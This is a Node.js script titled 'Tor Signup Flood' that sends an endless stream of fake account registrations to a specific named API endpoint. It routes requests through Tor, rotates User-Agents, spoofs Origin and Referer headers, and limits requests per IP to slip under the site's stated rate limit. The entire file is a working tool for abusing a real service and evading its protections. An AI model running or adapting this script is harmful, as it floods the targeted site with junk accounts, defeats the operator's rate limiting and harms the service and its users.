const axios = require('axios');
const fs = require('fs');

// ====================== CONFIG ======================
const URL = 'https://api.aryankaushik.space/api/auth/signup';
const TOR_PROXY = 'socks5://127.0.0.1:9050';
const REQUESTS_PER_IP = 6;          // Safe under 8/hour limit
const TIMEOUT_MS = 15000;

// Load User-Agents
let userAgents = [];
try {
    userAgents = fs.readFileSync('user-agents.txt', 'utf8')
                   .split('\n')
                   .map(ua => ua.trim())
                   .filter(ua => ua.length > 20);
    console.log(`✅ Loaded ${userAgents.length} User-Agents`);
} catch (e) {
    console.error("user-agents.txt not found, using default");
    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
}

// Create Socks Agent properly
const { SocksProxyAgent } = require('socks-proxy-agent');
const agent = new SocksProxyAgent(TOR_PROXY);

function randomString(len = 12) {
    return Math.random().toString(36).substring(2, len + 2);
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function getCurrentIP() {
    try {
        const res = await axios.get('https://ipinfo.io/json', {
            httpsAgent: agent,
            timeout: TIMEOUT_MS
        });
        console.log(`\n🌍 NEW IP → ${res.data.ip} | ${res.data.city}, ${res.data.country}`);
    } catch (e) {
        console.log(`\n⚠️ IP Check Failed`);
    }
}

async function sendSignup(count) {
    const rand1 = randomString(8);
    const rand2 = randomString(6);

    const username = `user_${rand1}`;
    const email = `u${rand1}${rand2}@outlook.com`;
    const password = `Pass${rand1}123!`;

    const payload = { username, email, password };

    try {
        const res = await axios.post(URL, payload, {
            httpsAgent: agent,
            timeout: TIMEOUT_MS,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': getRandomUserAgent(),
                'Origin': 'https://aeroweb.aryankaushik.space',
                'Referer': 'https://aeroweb.aryankaushik.space/'
            }
        });
        console.log(`[${count}] ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
    } catch (err) {
        const status = err.response ? err.response.status : 'ERROR';
        const body = err.response ? JSON.stringify(err.response.data) : err.message;
        console.log(`[${count}] ${email} → ${status} | ${body}`);
    }
}

async function main() {
    console.log("=== Tor Signup Flood (Outlook Alias + Random UA) Started ===\n");
    let batch = 1;

    while (true) {
        console.log(`\n🔄 === Batch ${batch} ===`);
        await getCurrentIP();

        for (let i = 1; i <= REQUESTS_PER_IP; i++) {
            await sendSignup(i);
        }

        console.log(`✅ Batch ${batch} finished (${REQUESTS_PER_IP} requests)\n`);
        batch++;
        await new Promise(r => setTimeout(r, 1200));
    }
}

main().catch(console.error);
